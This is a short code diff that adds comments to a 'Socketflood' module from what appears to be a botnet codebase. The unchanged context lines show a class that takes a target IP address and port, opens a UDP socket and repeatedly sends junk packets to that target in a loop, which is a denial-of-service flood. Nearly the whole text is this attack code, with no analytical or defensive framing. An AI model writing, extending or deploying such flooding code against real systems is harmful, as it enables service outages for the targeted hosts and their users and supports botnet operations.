@@ -5,7 +5,9 @@ import socket as socketlib
 from botnet import logger
 from botnet.modules.base_module import TimedModule
 
+# Socketflood class
 class Socketflood(TimedModule):
+    # Setup params and socket object
     def __init__(self, params):
         self.target_ip = params[0]
         self.target_port = int(params[1])
@@ -15,5 +17,6 @@ class Socketflood(TimedModule):
 
         self.socket = socketlib.socket(socketlib.AF_INET, socketlib.SOCK_DGRAM)
 
+    # Flood
     def in_loop(self):
         self.socket.sendto("FFFFFFFFFFFFFFFFFFFFFFFFFFFFF".encode(), (self.target_ip, self.target_port))
